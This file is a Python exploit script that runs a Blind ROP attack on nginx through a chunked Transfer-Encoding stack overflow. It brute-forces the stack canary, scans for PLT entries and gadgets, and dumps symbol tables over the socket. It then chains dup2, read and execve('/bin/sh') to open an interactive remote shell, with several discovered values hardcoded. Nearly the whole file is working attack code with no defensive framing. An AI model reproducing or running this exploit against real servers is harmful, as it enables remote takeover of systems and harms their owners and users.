#!/bin/python
import socket,time
from termcolor import *
from pwn import *

header =  'GET / HTTP/1.1\r\n'
header += 'Host: pwn.me\r\n'
header += 'Accept: */*\r\n'
header += 'Transfer-Encoding: chunked\r\n'
header += 'Connection: Keep-Alive\r\n\r\n'

vsyscall = 0xffffffffff600000
padval = 0x4141414141414141
death = 0x41414141414141
text = 0x400000

class nginx():

    def __init__(self,ip,port):

        self.ip = ip
        self.port =port
        self.header = header #+ 'deadbeefdeadbeeff' + '\r\n'
        self.body = header + 5016 * 'A'

    def get_socket(self):
        #time.sleep(0.02)

        address = (self.ip, self.port)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect(address)
        #print "[+] Connected to ",ip,"on port",port

        return self.s

    def close_socket(self):

        self.s.close()
        #print "[+] Closed connection to ",ip,"on port",port
        return

    def send_body(self, data):

        body = self.body + data
        self.s.send(body)

        return

    def test_data(self, data):

        self.get_socket()
        self.send_body(data)

        r = self.check_alive()
        self.close_socket()

        return r

    def check_alive(self):

        self.s.settimeout(1) #3

        try:
            data = self.s.recv(512)

        except socket.timeout as e:
            print colored("[+] Hang ......",'red') 
            #print colored(e,'red') 
            return 2 

        if len(data): 
            return True
        else:  #crash
            return False 

    def test_group(self):

        for i in range(1,200):
            print colored('[*] Finding canary offset... Qword:{}'.format(i),'magenta')
            data = 'B'*i*8

            if not self.test_data(data):
                break

        print colored('[+]Found canary offset in {} Qword'.format(i),'blue')
        return i-1

    def get_offset(self):

        group = self.test_group()
        num = 8 * group

        for i in range(1,9):
            temp = num + i
            print colored('[*] Finding canary offset... Byte:{}'.format(temp),'magenta')
            data = 'B' * temp

            if not self.test_data(data):
                break

        self.body += 'B'*(temp -1)
        print colored('[+]Found canary offset {}'.format(temp),'blue')
        return temp

    def find_canary(self):

        canary = ''
        for i in range(8):
            print colored('[*] Finding the {}th Byte of canary'.format(i+1),'magenta')

            for j in range(256):
                print colored('[*] Test the {}th byte: {}?'.format(i+1,j),'magenta')
                data = p8(j)

                if self.test_data(data):
                    print colored('[+] Find the {}th byte: {}'.format(i+1,j),'cyan')
                    canary += p8(j)
                    self.body += p8(j)
                    break 

        return u64(canary)

    def find_stack(self):

        for i in range(1,20):
            data = p64(text)*i

            if not self.test_data(data):
                break

        self.depth = i - 1
        print colored('[+]Found stack depth: {}'.format(self.depth),'blue')
        #self.body += 'B'*(i-1)
        return i

    def try_plt(self, depth, plt):

        data = ''
        for i in range(depth):
            data += p64(plt)

        if self.test_data(data)==2:
                print colored('[*] Testing {} in depth {}'.format(hex(plt + 6), depth),'magenta')
                data = ''

                for i in range(depth):
                    data += p64(plt + 6)

                if self.test_data(data)==2:
                    return True

	return False

    def find_plt(self, dep = 0, start = text, len = 0x10000):

        plt = start
        end = plt + len  
        print colored('[*] Finding plt {} - {}'.format(hex(plt), hex(end)), 'blue')
        
        while True:
            for d in range(dep - 5, dep):
                print colored('[*] Testing {} in depth {}'.format(hex(plt), self.depth + d),'magenta')

                if self.try_plt(self.depth + d, plt):
                    self.d = self.depth + d
                    self.plt = plt
                    print colored('[+] Found PLT {} depth {}'.format(hex(plt),self.d), 'blue')
                    return True

            plt += 0x10 * 30

            if plt >= end:
                break

        return False

    def verify_gadget(self, gadget):

        pop_list = [0,0,0,1,0,0,0,0,0,0,1,1]

        for i in range(12):
            print colored('[+] The {}th addr matched: {}'.format(i+1,hex(gadget+i)),'blue')
            x = self.test_gadget(gadget+i, 1)
            if x == pop_list[i]:
                return False

        return True

    def test_gadget(self, gadget, pop_len):

        data = ''
        for i in range(self.depth):
            data += p64(padval)

        data += p64(gadget)
        data += p64(padval) * pop_len

        for i in range(self.d - self.depth - pop_len - 1):
            data += p64(self.plt)

        if self.test_data(data) == 2:
            return True

        return False

    def find_pop_6_ret(self, gadget):
        
        end = gadget
        gadget -= 9

        while gadget <= end:

            if self.test_gadget(gadget, 6):
                print colored('[*] Verify gadgets at {} ......'.format(hex(gadget)),'magenta')

                if self.verify_gadget(gadget):

                    self.rdi = gadget + 9
                    self.rsi = gadget + 7
                    print colored('[+] Found pop rsi at {}\n[+] Found pop rdi at {}'.format(hex(self.rsi),hex(self.rdi)),'blue')
                    return True

            gadget += 1

        return False

    def find_gadget(self):

        gadget = 0x430000

        while True:
            print colored('[*] Finding useful gadget at {}'.format(hex(gadget)),'magenta')

            if self.test_gadget(gadget, 1):
                print colored('[*] Testing useful gadget at {}'.format(hex(gadget)),'magenta')

                if self.find_pop_6_ret(gadget):
                    return True

            gadget += 16

        return False

    def call_plt(self,entry, arg1, arg2):

        data = ''
	for i in range(self.depth):
            data += p64(padval)
        data += p64(self.rdi)
        data += p64(arg1)

        data += p64(self.rsi)
        data += p64(arg2)
        data += p64(0)

	data += p64(self.plt + 0xb)
	data += p64(entry)

        for i in range(self.d - self.depth - 7):
            data += p64(self.plt)

        if self.test_data(data)==2:
            return True

        return False

    def try_strcmp(self, entry):

        print colored("[*] Trying PLT entry {}".format(hex(entry)),'magenta')

        good = 0x400000

	if self.call_plt(entry, 3, 5):
            print colored("False: arg1:3 arg:5 called",'red')
            return False 

	if self.call_plt(entry, good, 5):
            print colored("False: arg1:0x400000 arg:5 called",'red')
            return False 

	if self.call_plt(entry, 3, good):
            print colored("False: arg1:3 arg:0x400000 called",'red')
            return False 

	if not self.call_plt(entry, good, good):
            print colored("False: arg1:0x400000 arg:0x400000 failed",'red')
            return False

	if not self.call_plt(entry, vsyscall + 0x1000 - 1, good):
            print colored("False: arg1:{} arg:0x400000 failed".format(hex(vsyscall + 0x1000 - 1)),'red')
            return False 

	return True

    def find_strcmp(self):

        print colored("[*] Finding strcmp ......",'magenta')

        for i in range(256):
            if self.try_strcmp(i):
                print colored("[+] Found strcmp at PLT {}".format(hex(i)),'blue')
                self.strcmp = i
                return True

        return False

    def set_rdx(self, data, good = 0x400000):

        data += p64(self.rdi)
        data += p64(good)

        data += p64(self.rsi)
        data += p64(good)
        data += p64(0)

	data += p64(self.plt + 0xb)
	data += p64(self.strcmp)

        return data

    def got_write(self, x):

        if len(x) < 4:
            return False

        if x[0] != '\x7f':
            return False

	if x[1] != 'E':
            return False

	if x[2] != 'L':
            return False

	if x[3] != 'F':
            return False

	return True

    def try_write(self, fd, write):

	addr = 0x400000

	data = ''
        for i in range(self.depth):
            data += p64(padval)

        if fd == -1:
	    for fd in range(50):
                data = self.set_rdx(data)

                data += p64(self.rdi)
                data += p64(fd)

                data += p64(self.rsi)
                data += p64(addr)
                data += p64(0)

	        data += p64(self.plt + 0xb)
	        data += p64(write)

        else:
            data = self.set_rdx(data)

            data += p64(self.rdi)
            data += p64(fd)

            data += p64(self.rsi)
            data += p64(addr)
            data += p64(0)

	    data += p64(self.plt + 0xb)
	    data += p64(write)

        data += p64(death)

        self.get_socket()
        self.send_body(data)

        x = self.s.recv(512)
	self.close_socket()

	return self.got_write(x)

    def find_fd(self):

        for i in range(50):
            if self.try_write(i, self.write):
                print colored("[+] Found fd: {}".format(i),'blue')
                self.fd = i
                return True
        return False

    def find_write(self):

        print colored("[*] Finding write ......",'magenta')

	listeners = []

	for write in range(256):

            print colored("[*] Trying PLT entry {}".format(hex(write)),'magenta')

            if self.try_write(-1, write):
                print colored("[+] Found write at PLT {}".format(hex(write)),'blue')
                self.write = write
                self.find_fd()
                return True

        return False

    def find_dup(self):
        # Discard function

        print colored("[*] Find dup2 ......",'magenta')

        fd = 100

        for i in range(256):

            print colored("[*] Trying dup2 at PLT {}".format(hex(i)),'magenta')

	    data = ''
            for d in range(self.depth):
                data += p64(padval)

            data += p64(self.rdi)
            data += p64(self.fd)

            data += p64(self.rsi)
            data += p64(fd)
            data += p64(0)

	    data += p64(self.plt + 0xb)
	    data += p64(i)

            data = self.set_rdx(data)

            data += p64(self.rdi)
            data += p64(fd)

            data += p64(self.rsi)
            data += p64(0x400000)
            data += p64(0)

	    data += p64(self.plt + 0xb)
	    data += p64(self.write)

            data += p64(death)

            self.get_socket()
            self.send_body(data)

            x = self.s.recv(4096)

	    self.close_socket()

	    if self.got_write(x):
                print colored("[+] Found dup2 at PLT {}".format(i),'blue')
                #self.dup = i
                return True
        return False

    def dump_addr(self, addr):

	data = ''
        for i in range(self.depth):
            data += p64(padval)

        for i in range(20):

            data = self.set_rdx(data)

            data += p64(self.rdi)
            data += p64(self.fd)

            data += p64(self.rsi)
            data += p64(addr + (i * 7))
            data += p64(0)

	    data += p64(self.plt + 0xb)
	    data += p64(self.write)

        data += p64(death)

        self.get_socket()
        self.send_body(data)

        x = ""

        while True:

            r = self.s.recv(4096)
            if len(r) == 0:
                break

            x += r

        self.close_socket()

        return x

    def has_str(self, stuff, skip = 0, strict = False):

        state = 0

        len = 0
        min = 3

        #print colored(stuff, 'yellow')

        for c in stuff:
            if skip > 0:
                skip -= 1
                continue
            ascii = (c >= '\x20' and c <= '\x7E')
            #print colored('{} {}'.format(c,ascii),'red')

            if state == 0:
                if ascii:
                    state = 1
                    len = 0
                else:
                    if strict:
                        return False
            elif state == 1: 
                if ascii:
                    len += 1
                elif c == '\x00':
                    if len >= min:
                        state = 2
                        len = 0
                    else:
                        state = 0
                        if strict:
                            return False
                else:
                     state = 0
                     if strict:
                         return False

            elif state == 2:
                if ascii:
                    len += 1
                    if len >= min:
                        return True
                else:
                    state = 0
                    if strict:
                        return False

            else:
                print colored("It's impossible",'red')

        return False

    def got_sym(self):

        self.get_execve()
        self.get_usleep()
        self.get_read()
        self.get_dup2()
        return

    def find_rel(self, prog):

        check = 3

        for i in range(len(prog)):

            rem = len(prog) - i

            if rem < (24 * check):
                break

            good = True

            for j in range(check):

                idx = i + j * 24

                type_t = u32(prog[idx:(idx + 4)])

                if type_t != 7:
                    good = False
                    break

                val = u64(prog[(idx + 8):(idx + 8 + 8)])

                if val != 0:
                    good = False
                    break

            if good:
                return i

        return False

    def read_rel(self, addr, symtab):

        start = addr

        #print colored(symtab,'cyan')

        print colored("[*] Reading rela ......",'magenta')
        prog = ""
        idx = 0

        while True:
            print colored("[*] Reading {}".format(hex(addr)),'magenta')
            x = self.dump_addr(addr)
            #print colored(x,'yellow')

            if len(x) == 0:
                print colored("Unbelieveable",'red')

            prog += x
            addr += len(x)

            idx = self.find_rel(prog)

            if idx > 0:
                break 

        if idx < 8:
            print colored("......",'red')

        idx -= 8

        print colored("[+] Found rela at {}".format(hex((idx + start))),'blue')

        slot = 0

        need = [ "read", "usleep", "execve", "ftruncate64", "exit" , "dup2"]

        self.slot_dict = {}

        while True:

            while len(prog) - idx < 24:
                print colored("Reading {}".format(hex(addr)),'magenta')
                x = self.dump_addr(addr);

                if len(x) == 0:
                    print colored("sssssss",'red') 

                prog += x
                addr += len(x)

            type_t = u32(prog[(idx + 8):(idx + 8 + 4)])

            if type_t != 0x7:
                print colored("[+] Rela parsing completed",'blue')
                return

            num = u32(prog[(idx + 8 + 4):(idx + 8 + 4 + 4)])

            if num > len(symtab):
                print colored("It doesn't matter",'red')

            name = symtab[num]

            print colored("[+] Slot {} num {} {}".format(slot,num,name),'cyan')

            if name in need:
                #print colored("[+] Found {} at {}".format(name, slot),'blue')
                self.slot_dict[name] = slot

            if len(need) == 0:
                break

            idx += 24
            slot += 1

        return

    def read_sym(self):
        print colored("[*] Reading sym ......",'magenta')

        prog = ""
        addr_start = 0x400200
        addr = addr_start
        dynstr = 0

        while True:
            print colored("[*] Reading {}".format(hex(addr)),'magenta')
            x = self.dump_addr(addr)
            if len(x) == 0:
                return False

            prog += x
            addr += len(x)
            
            #print colored(self.has_str(prog),'yellow')
            if dynstr == 0 and self.has_str(prog):
                print colored("[+] Found strings at {}".format(hex(addr)),'blue')
                for i in range(len(prog)):
                    if self.has_str(prog, i, True):
                        dynstr = addr_start + i

                        if i < 1 or prog[i - 1] != "\x00":
                            return False

                        dynstr -= 1
                        print colored("[+] Found dynstr at {}".format(hex(dynstr)),'blue')
                        break

            if dynstr != 0:
                break

        # XXX check 24 byte alignment
        idx = dynstr - addr_start

        dynsym = 0
        symlen = 24

        while idx >= 0:

            zeros = 0

            for i in range(symlen):

                c = prog[idx + i]

                if c == "\x00":
                    zeros += 1 

                if zeros == symlen:
                    dynsym = addr_start + idx
                    print colored("[+] Found dynsym at {}".format(hex(dynsym)),'blue')
                    self.rdx_0 = dynsym
                    break

            if dynsym != 0:
                break

            idx -= symlen

        idx = dynsym - addr_start

        print colored("[*] Dumping symbols ......",'magenta')

        symno = 0
        symtab = {}
        self.writable = False

        while idx < (dynstr - addr_start):

            stri = prog[idx:(idx + 4)]
            stri = u32(stri)

            type_t = prog[idx + 4]
            type_t = u8(type_t)
            type_t &= 0xf

            val = prog[(idx + 8):(idx + 16)]
            val = u64(val)

            #print colored('{} {} {}'.format(stri,type_t,val),'yellow')

            if stri > 0:

                need = dynstr + stri + 30

                while addr < need:
                    print colored("[*] Reading {}".format(hex(addr)),'magenta')
                    x = self.dump_addr(addr)
                    if len(x) == 0:
                        print colored('What?','red')

                    prog += x
                    addr += len(x)

                strstart = dynstr + stri - addr_start
                strend = strstart
                for i in range(strstart,len(prog)):
                    if prog[i] == "\x00":
                        strend = i - 1
                        break

                symname = prog[strstart:strend + 1]
                if val!= 0:
                    print colored("[+] Sym {} {} {} {}".format(symno + 1,type_t,symname,hex(val)),'blue')
                else:
                    print colored("[+] Sym {} {} {}".format(symno + 1,type_t,symname),'blue')

                symtab[symno + 1] = symname

                symno += 1

                if type_t == 1 and not self.writable:
                    self.writable = val
                    print colored("[+] Writable at {}".format(hex(self.writable)),'cyan')

            idx += symlen

        self.read_rel(addr, symtab)
        self.got_sym()
        return

    def get_execve(self):

        self.execve = self.slot_dict['execve']

        print colored('[+] Found execve at slot {}'.format(self.execve),'blue')

        if not self.execve:
            pass

    def get_usleep(self):

        self.usleep = self.slot_dict['usleep']

        print colored('[+] Found usleep at slot {}'.format(self.usleep),'blue')

        if not self.usleep:
            pass

    def get_read(self):

        self.read = self.slot_dict['read']

        print colored('[+] Found read at slot {}'.format(self.read),'blue')

        if not self.read:
            pass

    def get_dup2(self):

        self.dup2 = self.slot_dict['dup2']

        print colored('[+] Found dup2 at slot {}'.format(self.dup2),'blue')

        if not self.dup2:
            pass

    def dup_fd(self, data, fd, src = False):

        data += p64(self.rsi)
        data += p64(fd)
        data += p64(0)

        if src != False:
            data += p64(self.rdi)
            data += p64(src)

        data += p64(self.plt + 0xb)
        data += p64(self.dup2)  #self.dup

        return data

    def do_read(self, data, fd, writable):

        data = self.set_rdx(data, self.goodrdx)

        data += p64(self.rdi)
        data += p64(fd)

        data += p64(self.rsi)
        data += p64(writable)
        data += p64(0)

        data += p64(self.plt + 0xb)
        data += p64(self.write)


        data += p64(self.rdi)
        data += p64(1000 * 1000 * 2)

        data += p64(self.plt + 0xb)
        data += p64(self.usleep)

        data = self.set_rdx(data, self.goodrdx)

        data += p64(self.rdi)
        data += p64(fd)

        data += p64(self.rsi)
        data += p64(writable)
        data += p64(0)

        data += p64(self.plt + 0xb)
        data += p64(self.read)

        data = self.set_rdx(data, self.goodrdx)

        data += p64(self.rdi)
        data += p64(fd)

        data += p64(self.rsi)
        data += p64(writable)
        data += p64(0)

        data += p64(self.plt + 0xb)
        data += p64(self.write)

        return data

    def find_good_rdx(self):

        print colored("[*] Finding good rdx ......",'magenta')

        addr = self.rdi - 9

        #fd = 100

        while True:

            data = ''
            for i in range(self.depth):
                data += p64(padval)

            #data = self.dup_fd(data, fd, 3)
            data = self.set_rdx(data, addr)

            data += p64(self.rdi)
            data += p64(self.fd)

            data += p64(self.rsi)
            data += p64(addr)
            data += p64(0)

            data += p64(self.plt + 0xb)
            data += p64(self.write)
            data += p64(death)

            self.get_socket()
            self.send_body(data)
            x = self.s.recv(4096)

            #print colored(x,'yellow')

            print colored("[+] Receive {} bytes at {}".format(len(x),hex(addr)),'blue')

            if len(x) >= 8:
                self.goodrdx = addr
                break

	    addr += (len(x)+1)
            if len(x) == 0:
                addr += 1

        return

    def do_cli(self):

        while True:

           a = ''

           print '\nshell>',

           cli_t = raw_input()
           self.s.send(cli_t)
           self.s.settimeout(0.5)

           try:
               a = self.s.recv(4096)

           except socket.timeout as e:
               print colored("\b[+] Command has been sent",'yellow')
               continue

           except Exception as e:
               print colored(e,'yellow')

           print colored('\b{}'.format(a[:-1]),'cyan')
           print colored('\b[+] {} bytes received'.format(len(a)),'green')

        return
               
    def do_execve(self, execve):

        print colored("[*] Let's exploit it......",'magenta')

        #fd = 100

        writable = self.writable
        str_t = "/bin/sh\0"

	data = ''
        for i in range(self.depth):
            data += p64(padval)

	#data = self.dup_fd(data, fd, self.fd)
	data = self.dup_fd(data, 0, self.fd)
	data = self.dup_fd(data, 1, self.fd)
	data = self.dup_fd(data, 2, self.fd)

	data = self.do_read(data, self.fd, writable)

	data = self.set_rdx(data, self.rdx_0)

        data += p64(self.rdi)
        data += p64(writable)

        data += p64(self.rsi)
        data += p64(0)
        data += p64(0)

        data += p64(self.plt + 0xb)
        data += p64(execve)
        data += p64(death)

        self.get_socket()
        self.send_body(data)

        x = self.s.recv(1)

        print colored("[*] Send strings: '/bin/sh'",'magenta')
        self.s.send(str_t)

        print colored("[*] Wait 2 secs......",'magenta')

        stuff = "" + x

        while True:

            try:
                x = self.s.recv(4096)

            except:
                break
          
            if len(x) == 0:
                break

            stuff += x

            if str_t in stuff:
                break
            
        if str_t not in stuff:
            print colored("[-] Write didn't happen",'red')
            self.close_socket()
            return

        print colored("[*] Send command: id",'magenta')
        self.s.send("\n\n\n\n\nid\n\n")

        while True:

            try:
                x = self.s.recv(4096)

            except:
                break

            if len(x) == 0:
                break

            if 'uid' in x:
                print colored("[+] Got response: {}".format(x), 'green')
                print colored("[+] Well done ! Enjoy yourself ...",'blue')

        try:
            self.do_cli()

        except KeyboardInterrupt as e:
            print colored('[+] KeyboardInterrupt','yellow')
            exit(0)

        self.close_socket()
        return

    def brop(self):

        offset = self.get_offset()
        #canary = self.find_canary()

        canary = 0xc245136250b27800
        self.body += p64(canary)
        print colored('[+] Find Canary {} at Offset {}'.format(hex(canary),offset),'cyan')

        #depth = self.find_stack()
        self.depth = 3
        self.d = 43

        #self.find_plt(41)
        self.plt = 0x402760

        #self.find_gadget()
        self.rdi = 0x430de4   
        self.rsi = 0x430de2

        #self.find_strcmp()
        self.strcmp = 0x1c
        #self.find_write()
        self.write = 0x60

        #self.find_dup()
        self.dup = 5
        self.fd = 3

        self.read_sym()
        self.find_good_rdx()

        self.do_execve(self.execve)
        return
     
if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 80
    ng = nginx(ip,port)
    ng.brop()
    exit(1)
